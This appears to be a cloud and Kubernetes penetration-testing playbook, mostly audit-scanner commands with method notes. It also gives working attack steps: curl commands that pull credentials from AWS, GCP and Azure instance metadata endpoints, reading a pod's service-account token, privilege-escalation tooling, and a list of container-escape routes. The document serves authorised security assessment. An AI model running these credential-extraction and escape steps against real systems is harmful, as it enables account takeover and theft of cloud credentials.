# Cloud, Kubernetes, Containers, IaC — attack & audit playbooks

Targets: AWS / Azure / GCP accounts, Kubernetes clusters, Docker hosts, IaC repos, service meshes.

## fingerprint-first

For clouds you are working with **identity, not network reach**:

```bash
aws sts get-caller-identity                          # who am I, which account
az account show                                       # subscription + tenant
gcloud config list                                    # project + account
kubectl auth can-i --list                             # what this kubeconfig can do
```

A posture run with no identity read first is noise — everything after is unattributed.

## 1. AWS posture + privesc

```bash
prowler aws --compliance cis_2.0 --output-dir {out}/prowler      # CIS, mapped control ids
scout suite aws --report-dir {out}/scout                          # second opinion, visual report
aws iam list-roles --output json | jq -r '.Roles[].AssumeRolePolicyDocument' > {out}/assume_map.txt
cloudmapper find_privesc --config {out}/config.json               # graph path to admin
pacu                                                              # iam__privesc_scan module
```

**Verify the privesc with a delta proof:** run one action before and after the escalation and show the
difference. AssumeRole alone proves nothing without the trust-policy check.

## 2. Metadata (IMDS) credential extraction

Via a web SSRF on the same host, or from the instance itself:

```bash
# IMDSv1 (no token)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
# IMDSv2 (PUT first)
TOKEN=$(curl -s -X PUT -H 'X-aws-ec2-metadata-token-ttl-seconds: 300' http://169.254.169.254/latest/api/token)
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' -H 'Metadata-Flavor: Google'
curl -s -H 'Metadata: true' http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**Proof closes at the swap:** exchange the credential on one clearly-scoped call, `get-caller-identity`
or equivalent, then write the principal into the finding. Keys and tokens never enter the report body —
location only.

## 3. IaC and secrets

```bash
checkov -d . --framework all --output json > {out}/checkov.json
terrascan scan -t all -i dockerfile -r -o {out}/terrascan.json {path}
conftest test --policy {out}/policies {path}/terraform/*.tf
trufflehog git https://github.com/{org}/{repo} --only-verified --json | head -80
gitleaks git ./ -v --redact
```

Map every finding to its file+line. Report a secret by **type + repo + fingerprint (first 8 chars)**,
never the full value.

## 4. Docker host & images

```bash
docker-bench-security.sh -l {out}/bench.log        # first — it tells you where to look
docker ps -a --format 'table {{.ID}}\t{{.Image}}\t{{.Status}}'
trivy image --scanners vuln,secret,config {image}
syft {image} -o spdx-json > {out}/sbom.json         # SBOM
dive {image} --json {out}/dive.json                 # layer waste + secrets in layers
```

A WARN that only appears in the container but not the host is the finding. Report CVEs with an available
fix only.

## 5. Kubernetes — hunt, then escape

```bash
kube-hunter --remote {k8s_host}                      # surface: anonymous access, 6443 exposure, dashboards
kube-bench run --json --outputfile {out}/bench.json   # CIS
kubescape scan framework nsa --output {out}/nsa.json
kubectl auth can-i --list                             # RBAC footprint of the identity you hold
kubectl get sa,rolebindings,clusterrolebindings -A
kubectl get pods -A -o yaml | grep -nE 'privileged: true|hostPath' | head
```

**Five escape roads** (test in order of noise→impact):

1. `docker.sock` / `containerd.sock` mounted in a pod
2. `hostPath: /` mounts
3. `privileged: true` containers (CAP_SYS_ADMIN)
4. service-account token in a pod with broad RBAC (`system:admin` bound SA)
5. unauthenticated API server (6443 anonymous=true) — immediately enumerate with `can-i`

**Read-only proof is always enough.** `kubectl exec ... cat /var/run/secrets/.../token` then
`kubectl auth can-i --as system:serviceaccount:{ns}:{sa} --list` writes the whole story without
touching a workload.

## 6. Evidence discipline specific to cloud

- record the **principal** you acted as (`get-caller-identity`)
- record the **account/subscription/project id**
- record the CIS control id for every compliance finding
- proofs land in `evidence/` (jq output files), never inline credentials
